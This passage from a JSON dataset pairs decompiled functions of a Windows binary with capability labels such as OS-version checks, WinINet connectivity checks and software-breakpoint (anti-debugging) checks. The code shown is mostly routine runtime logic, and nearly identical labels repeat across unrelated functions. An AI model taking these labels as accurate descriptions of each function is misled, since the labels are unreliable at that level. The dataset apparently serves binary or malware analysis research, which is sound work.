        "decompiled_code": "\nvoid __cdecl fcn.00430730(int32_t arg_8h)\n\n{\n    if ((arg_8h == 0x484680) && (*0x47b400 != NULL)) {\n    // WARNING: Could not recover jumptable at 0x00430757. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x47b400)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0043075b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0043075b(void)\n\n{\n    if (*0x47b400 != NULL) {\n    // WARNING: Could not recover jumptable at 0x0043076d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x47b400)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "004307ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004307ed(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    if (((arg_10h < (arg_8h - arg_ch) - 0x484680U) && (arg_8h == 0x484680)) && (*0x47b400 != NULL)) {\n        (**0x47b400)(0x484680);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00430d5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00430d5f(void)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar1 != NULL) && (*piVar1 == 0x5a4d)) && (piVar2 = *(piVar1 + 0x1e) + piVar1,  *piVar2 == 0x4550)) &&\n       ((piVar1 = 0x10b,  *(piVar2 + 6) == 0x10b && (0xe < piVar2[0x1d])))) {\n        return CONCAT31(1, piVar2[0x3a] != 0);\n    }\n    return piVar1 & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "00431048": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar (*) [16] __cdecl fcn.00431048(uchar (*arg_8h) [16], uchar (*arg_ch) [16])\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar (*pauVar5) [16];\n    uchar (*pauVar6) [16];\n    uchar auVar7 [16];\n    uchar auVar8 [16];\n    int16_t iVar9;\n    int16_t iVar10;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = **arg_ch;\n    uVar3 = uVar1;\n    if (uVar1 != 0) {\n        if (1 < *0x6ccba8) {\n            if ((arg_ch & 0xfff) < 0xff1) {\n                auVar7 = *arg_ch;\n            }\n            else {\n                auVar7 = CONCAT214(*0x47d04e, \n                                   CONCAT212(*0x47d04c, \n                                             CONCAT210(*0x47d04a, \n                                                       CONCAT28(*0x47d048, \n                                                                CONCAT26(*0x47d046, \n                                                                         CONCAT24(*0x47d044, \n                                                                                  CONCAT22(*0x47d042, *0x47d040)))))));\n                iVar4 = 8;\n                pauVar5 = arg_ch;\n                do {\n                    auVar7 = pinsrw(auVar7 >> 0x10, uVar3, 7);\n                    if (uVar3 != 0) {\n                        pauVar5 = *pauVar5 + 2;\n                        uVar3 = **pauVar5;\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\ncode_r0x004310c1:\n            while( true ) {\n                while( true ) {\n                    uVar3 = arg_8h & 0xfff;\n                    pauVar5 = arg_ch;\n                    if (uVar3 < 0xff1) break;\n                    if (**arg_8h == 0) goto code_r0x004312a0;\n                    pauVar6 = arg_8h;\n                    if (**arg_8h == uVar1) goto code_r0x004310f3;\n                    arg_8h = *arg_8h + 2;\n                }\n                pcmpistri(auVar7, *arg_8h, 0xd);\n                if (uVar3 < 0xff1) break;\n                arg_8h = arg_8h[1];\n            }\n            if (uVar3 < 0xff0) {\n                iVar4 = pcmpistri(auVar7, *arg_8h, 0xd);\n                arg_8h = *arg_8h + iVar4 * 2;\n                pauVar6 = arg_8h;\ncode_r0x004310f3:\n                do {\n                    for (; 0xff0 < (arg_8h & 0xfff); arg_8h = *arg_8h + 2) {\ncode_r0x00431148:\n                        if (**pauVar5 == 0) {\n                            return pauVar6;\n                        }\n                        if (**arg_8h != **pauVar5) goto code_r0x00431164;\n                        pauVar5 = *pauVar5 + 2;\n                    }\n                    uVar3 = pauVar5 & 0xfff;\n                    if (0xff0 < uVar3) goto code_r0x00431148;\n                    pcmpistri(*pauVar5, *arg_8h, 0xd);\n                    if (!SBORROW4(uVar3, 0xff0)) goto code_r0x00431164;\n                    if (uVar3 - 0xff0 < 0) {\n                        return pauVar6;\n                    }\n                    arg_8h = arg_8h[1];\n                    pauVar5 = pauVar5[1];\n                } while( true );\n            }\n            goto code_r0x004312a0;\n        }\n        if (*0x6ccba8 == 1) {\n            auVar7 = pshuflw(ZEXT216(uVar1), ZEXT216(uVar1), 0);\ncode_r0x0043118f:\n            for (; (arg_8h & 0xfff) < 0xff1; arg_8h = arg_8h[1]) {\n                iVar9 = SUB162(auVar7, 0);\n                iVar10 = SUB162(auVar7 >> 0x10, 0);\n                auVar8 = CONCAT214(-(*0x47d04e == *(*arg_8h + 0xe)), \n                                   CONCAT212(-(*0x47d04c == *(*arg_8h + 0xc)), \n                                             CONCAT210(-(*0x47d04a == *(*arg_8h + 10)), \n                                                       CONCAT28(-(*0x47d048 == *(*arg_8h + 8)), \n                                                                CONCAT26(-(*0x47d046 == *(*arg_8h + 6)), \n                                                                         CONCAT24(-(*0x47d044 == *(*arg_8h + 4)), \n                                                                                  CONCAT22(-(*0x47d042 == *(*arg_8h + 2)\n                                                                                            ), -(*0x47d040 == **arg_8h))\n                                                                                 )))))) |\n                         CONCAT214(-(*(*arg_8h + 0xe) == iVar10), \n                                   CONCAT212(-(*(*arg_8h + 0xc) == iVar9), \n                                             CONCAT210(-(*(*arg_8h + 10) == iVar10), \n                                                       CONCAT28(-(*(*arg_8h + 8) == iVar9), \n                                                                CONCAT26(-(*(*arg_8h + 6) == iVar10), \n                                                                         CONCAT24(-(*(*arg_8h + 4) == iVar9), \n                                                                                  CONCAT22(-(*(*arg_8h + 2) == iVar10), \n                                                                                           -(**arg_8h == iVar9))))))));\n                uVar2 = SUB161(auVar8 >> 7, 0) & 1 | (SUB161(auVar8 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar8 >> 0x17, 0) & 1) << 2 | (SUB161(auVar8 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar8 >> 0x27, 0) & 1) << 4 | (SUB161(auVar8 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar8 >> 0x37, 0) & 1) << 6 | (SUB161(auVar8 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar8 >> 0x47, 0) & 1) << 8 | (SUB161(auVar8 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar8 >> 0x57, 0) & 1) << 10 | (SUB161(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar8 >> 0x77, 0) & 1) << 0xe | SUB161(auVar8 >> 0x7f, 0) << 0xf;\n                if (uVar2 != 0) {\n                    uVar3 = 0;\n                    if (uVar2 != 0) {\n                        for (; (uVar2 >> uVar3 & 1) == 0; uVar3 = uVar3 + 1) {\n                        }\n                    }\n                    arg_8h = *arg_8h + (uVar3 & 0xfffffffe);\n                    break;\n                }\n            }\n            if (**arg_8h != 0) {\n                pauVar5 = arg_8h;\n                pauVar6 = arg_ch;\n                if (uVar1 == **arg_8h) {\ncode_r0x004311dc:\n                    for (; ((pauVar6 & 0xfff) < 0xff1 && ((pauVar5 & 0xfff) < 0xff1)); pauVar5 = pauVar5[1]) {\n                        auVar8 = CONCAT214(-(-(*(*pauVar5 + 0xe) == *(*pauVar6 + 0xe)) == *0x47d04e), \n                                           CONCAT212(-(-(*(*pauVar5 + 0xc) == *(*pauVar6 + 0xc)) == *0x47d04c), \n                                                     CONCAT210(-(-(*(*pauVar5 + 10) == *(*pauVar6 + 10)) == *0x47d04a), \n                                                               CONCAT28(-(-(*(*pauVar5 + 8) == *(*pauVar6 + 8)) ==\n                                                                         *0x47d048), \n                                                                        CONCAT26(-(-(*(*pauVar5 + 6) == *(*pauVar6 + 6))\n                                                                                  == *0x47d046), \n                                                                                 CONCAT24(-(-(*(*pauVar5 + 4) ==\n                                                                                             *(*pauVar6 + 4)) ==\n                                                                                           *0x47d044), \n                                                                                          CONCAT22(-(-(*(*pauVar5 + 2)\n                                                                                                      == *(*pauVar6 + 2)\n                                                                                                      ) == *0x47d042), \n                                                                                                   -(-(**pauVar5 ==\n                                                                                                      **pauVar6) ==\n                                                                                                    *0x47d040)))))))) |\n                                 CONCAT214(-(*0x47d04e == *(*pauVar6 + 0xe)), \n                                           CONCAT212(-(*0x47d04c == *(*pauVar6 + 0xc)), \n                                                     CONCAT210(-(*0x47d04a == *(*pauVar6 + 10)), \n                                                               CONCAT28(-(*0x47d048 == *(*pauVar6 + 8)), \n                                                                        CONCAT26(-(*0x47d046 == *(*pauVar6 + 6)), \n                                                                                 CONCAT24(-(*0x47d044 == *(*pauVar6 + 4)\n                                                                                           ), CONCAT22(-(*0x47d042 ==\n                                                                                                        *(*pauVar6 + 2))\n                                                                                                       , -(*0x47d040 ==\n                                                                                                          **pauVar6)))))\n                                                              )));\n                        uVar2 = SUB161(auVar8 >> 7, 0) & 1 | (SUB161(auVar8 >> 0xf, 0) & 1) << 1 |\n                                (SUB161(auVar8 >> 0x17, 0) & 1) << 2 | (SUB161(auVar8 >> 0x1f, 0) & 1) << 3 |\n                                (SUB161(auVar8 >> 0x27, 0) & 1) << 4 | (SUB161(auVar8 >> 0x2f, 0) & 1) << 5 |\n                                (SUB161(auVar8 >> 0x37, 0) & 1) << 6 | (SUB161(auVar8 >> 0x3f, 0) & 1) << 7 |\n                                (SUB161(auVar8 >> 0x47, 0) & 1) << 8 | (SUB161(auVar8 >> 0x4f, 0) & 1) << 9 |\n                                (SUB161(auVar8 >> 0x57, 0) & 1) << 10 | (SUB161(auVar8 >> 0x5f, 0) & 1) << 0xb |\n                                (SUB161(auVar8 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar8 >> 0x6f, 0) & 1) << 0xd |\n                                (SUB161(auVar8 >> 0x77, 0) & 1) << 0xe | SUB161(auVar8 >> 0x7f, 0) << 0xf;\n                        if (uVar2 != 0) {\n                            uVar3 = 0;\n                            if (uVar2 != 0) {\n                                for (; (uVar2 >> uVar3 & 1) == 0; uVar3 = uVar3 + 1) {\n                                }\n                            }\n                            pauVar5 = *pauVar5 + (uVar3 & 0xfffffffe);\n                            pauVar6 = *pauVar6 + (uVar3 & 0xfffffffe);\n                            break;\n                        }\n                        pauVar6 = pauVar6[1];\n                    }\n                    if (**pauVar6 == 0) {\n                        return arg_8h;\n                    }\n                    if (**pauVar5 == **pauVar6) {\n                        pauVar5 = *pauVar5 + 2;\n                        pauVar6 = *pauVar6 + 2;\n                        goto code_r0x004311dc;\n                    }\n                }\n                arg_8h = *arg_8h + 2;\n                goto code_r0x0043118f;\n            }\n        }\n        else if (**arg_8h != 0) {\n            var_8h = arg_8h - arg_ch;\n            pauVar5 = arg_ch;\n            do {\n                do {\n                    if (**pauVar5 == 0) {\n                        return arg_8h;\n                    }\n                } while ((*(*pauVar5 + var_8h) == **pauVar5) && (pauVar5 = *pauVar5 + 2,  *(*pauVar5 + var_8h) != 0));\n                if (**pauVar5 == 0) {\n                    return arg_8h;\n                }\n                arg_8h = *arg_8h + 2;\n                var_8h = var_8h + 2;\n                pauVar5 = arg_ch;\n            } while (**arg_8h != 0);\n        }\ncode_r0x004312a0:\n        arg_8h = NULL;\n    }\n    return arg_8h;\ncode_r0x00431164:\n    arg_8h = *pauVar6 + 2;\n    goto code_r0x004310c1;\n}\n",
        "token_count": 3270
    },
    "00433c30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433c30(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x30);\n    fcn.004327f4(*(unaff_EBP + -0x34));\n    iVar1 = fcn.00432cbe();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x38);\n    iVar1 = fcn.00432cbe();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x3c);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || ((unaff_ESI[5] == 0x19930521 || (unaff_ESI[5] == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x40) == 0 && (unaff_EBX != 0)))) {\n        iVar1 = fcn.0043235b(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00432251(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "00433d4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00433d4d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    code *pcVar2;\n    int32_t arg_10h_01;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486698, 0x10);\n    arg_10h_01 = fcn.0043b664(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = arg_10h_01;\n    iVar3 = fcn.00432cbe();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (arg_10h_01 != *(unaff_EBP + 0x14)) {\n        if ((arg_10h_01 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= arg_10h_01)) goto code_r0x00433e2f;\n        iVar1 = *(iVar3 + 8);\n        arg_10h_00 = *(iVar1 + arg_10h_01 * 8);\n        *(unaff_EBP + -0x20) = arg_10h_00;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + arg_10h_01 * 8) != 0) {\n            fcn.0043b681(*(unaff_EBP + 8), iVar3, arg_10h_00);\n            fcn.00433fd0(*(*(iVar3 + 8) + 4 + arg_10h_01 * 8), *(unaff_EBP + 8), 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        arg_10h_01 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = arg_10h_01;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00433e1b();\n    if (arg_10h_01 == *(unaff_EBP + 0x14)) {\n        fcn.0043b681(*(unaff_EBP + 8), *(unaff_EBP + 0x10), arg_10h_01);\n        *in_FS_OFFSET = *(unaff_EBP + -0x10);\n        return;\n    }\ncode_r0x00433e2f:\n    fcn.0045ad41();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 730
    },
    "00433e1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00433e1b(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00432cbe();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.00432cbe();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0043406a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043406a(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.0043434e(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "004340dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004340dd(char *arg_8h)\n\n{\n    int32_t arg_ch;\n    uint *in_ECX;\n    \n    arg_ch = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        do {\n            arg_ch = arg_ch + 1;\n        } while (arg_8h[arg_ch] != '\\0');\n        if (arg_ch != 0) {\n            fcn.004343bf(arg_8h, arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0043434e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043434e(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch < 1)) {\n        *(in_ECX + 1) = 2;\n        return;\n    }\n    if (arg_ch == 1) {\n        ppcVar3 = fcn.00437f77(8);\n        if (ppcVar3 != NULL) {\n            uVar1 = *arg_8h;\n            *ppcVar3 = vtable.charNode.0;\n            *(ppcVar3 + 1) = uVar1;\n            goto code_r0x00434391;\n        }\n    }\n    else {\n        iVar2 = fcn.00437f77(0xc);\n        if (iVar2 != 0) {\n            ppcVar3 = fcn.0043409d(arg_8h, arg_ch);\n            goto code_r0x00434391;\n        }\n    }\n    ppcVar3 = NULL;\ncode_r0x00434391:\n    *in_ECX = ppcVar3;\n    if (ppcVar3 == NULL) {\n        *(in_ECX + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 310
    },
    "004343bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004343bf(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch < 1)) {\n        *(in_ECX + 1) = 2;\n        return;\n    }\n    if (arg_ch == 1) {\n        ppcVar3 = fcn.00437f77(8);\n        if (ppcVar3 != NULL) {\n            uVar1 = *arg_8h;\n            *ppcVar3 = vtable.charNode.0;\n            *(ppcVar3 + 1) = uVar1;\n            goto code_r0x00434402;\n        }\n    }\n    else {\n        iVar2 = fcn.00437f77(0xc);\n        if (iVar2 != 0) {\n            ppcVar3 = fcn.00434110(arg_8h, arg_ch);\n            goto code_r0x00434402;\n        }\n    }\n    ppcVar3 = NULL;\ncode_r0x00434402:\n    *in_ECX = ppcVar3;\n    if (ppcVar3 == NULL) {\n        *(in_ECX + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "00434c53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434c53(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    \n    if (((*in_ECX != 9) && (*arg_8h != 0)) && (piVar1 = fcn.00437f77(8),  piVar1 != NULL)) {\n        *piVar1 = *arg_8h;\n        piVar1[1] = arg_8h[1];\n        *in_ECX = *in_ECX + 1;\n        in_ECX[*in_ECX + 1] = piVar1;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00434cd7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434cd7(int32_t param_1)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    \n    if (*(param_1 + 4) != 0) {\n        puVar1 = *(param_1 + 8);\n        *(param_1 + 0xc) = puVar1;\n        while (puVar1 != NULL) {\n            pcVar2 = *(param_1 + 4);\n            *(param_1 + 8) = *puVar1;\n            (**0x47b3f8)(puVar1);\n            (*pcVar2)();\n            puVar1 = *(param_1 + 8);\n            *(param_1 + 0xc) = puVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00435b49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00435b49(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_stack_ffffffe0;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c != '\\0') {\n        var_8h = 0;\n        var_4h = 0;\n        fcn.00435abf(0x26);\n        arg_8h_00 = fcn.00439bce(&var_10h);\n        fcn.00434b03(arg_8h_00);\n        if (**0x6ccc1c == '@') {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        in_stack_ffffffe0 = 2;\n    }\n    fcn.00434635(in_stack_ffffffe0);\n    return arg_8h;\n}\n",
        "token_count": 244
    },
    "00435bb1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00435bb1(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    uint32_t arg_ch;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar1 = true;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    do {\n        if (**0x6ccc1c == '@') {\n            return arg_8h;\n        }\n        if (**0x6ccc1c == 'Z') {\n            return arg_8h;\n        }\n        if (bVar1) {\n            bVar1 = false;\n        }\n        else {\n            fcn.00434b5a(0x2c);\n        }\n        pcVar2 = *0x6ccc1c;\n        if (**0x6ccc1c == '\\0') {\n            if ('\\x01' < *(arg_8h + 1)) {\n                return arg_8h;\n            }\n            if (*arg_8h != 0) {\n                fcn.004341df(0x47dfec);\n                return arg_8h;\n            }\n            fcn.00434903(1);\n            return arg_8h;\n        }\n        arg_ch = **0x6ccc1c - 0x30;\n        if (arg_ch < 10) {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            piVar3 = fcn.00434935(&var_18h, arg_ch);\n            if (*(arg_8h + 1) < '\\x02') {\n                iVar4 = *piVar3;\n                if (*arg_8h == 0) {\n                    if (iVar4 == 0) {\n                        iVar4 = *(piVar3 + 1);\ncode_r0x00435c3e:\n                        fcn.00434903(iVar4);\n                    }\n                    else {\n                        *arg_8h = iVar4;\n                        arg_8h[1] = piVar3[1];\n                    }\n                }\n                else if (iVar4 == 0) {\n                    iVar4 = *(piVar3 + 1);\n                    if (iVar4 != 0) {\n                        if ((iVar4 == 2) || (iVar4 == 3)) goto code_r0x00435c3e;\n                        arg_8h_00 = fcn.0043acc3(iVar4);\n                        fcn.004341df(arg_8h_00);\n                    }\n                }\n                else {\n                    fcn.0043419e(iVar4);\n                }\n            }\n        }\n        else {\n            var_8h = 0;\n            var_4h = 0;\n            fcn.00438abf(&var_10h, &var_8h);\n            if ((1 < *0x6ccc1c - pcVar2) && (**0x6ccc10 != 9)) {\n                fcn.00434c53(&var_10h);\n            }\n            fcn.00434b03(&var_10h);\n            if (*0x6ccc1c == pcVar2) {\n                arg_8h[1] = 0;\n                *arg_8h = 0;\n                *(arg_8h + 1) = 2;\n            }\n        }\n        if (*(arg_8h + 1) != '\\0') {\n            return arg_8h;\n        }\n    } while( true );\n}\n",
        "token_count": 807
    },
    "00435e23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00435e23(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_stack_ffffffdc;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c != '\\0') {\n        fcn.00439bce(&var_8h);\n        fcn.00434b5a(0x5b);\n        arg_8h_00 = fcn.00439bce(&var_10h);\n        fcn.00434b03(arg_8h_00);\n        fcn.00434b5a(0x5d);\n        if (**0x6ccc1c == '@') {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        in_stack_ffffffdc = 2;\n    }\n    fcn.00434635(in_stack_ffffffdc);\n    return arg_8h;\n}\n",
        "token_count": 254
    },
    "00435e97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00435e97(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_stack_ffffffdc;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c != '\\0') {\n        fcn.00439fa8(&var_10h);\n        fcn.00434a2b(&var_8h, 0x7b);\n        while( true ) {\n            arg_8h_00 = fcn.00439bce(&var_10h);\n            fcn.00434b03(arg_8h_00);\n            if (**0x6ccc1c != '@') break;\n            if ((*0x6ccc1c)[1] == '@') {\n                *0x6ccc1c = *0x6ccc1c + 2;\n                fcn.00434b5a(0x7d);\n                *arg_8h = var_8h;\n                arg_8h[1] = var_4h;\n                return arg_8h;\n            }\n            *0x6ccc1c = *0x6ccc1c + 1;\n            fcn.00434b5a(0x2c);\n        }\n        in_stack_ffffffdc = 2;\n    }\n    fcn.00434635(in_stack_ffffffdc);\n    return arg_8h;\n}\n",
        "token_count": 320
    },
    "00437145": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
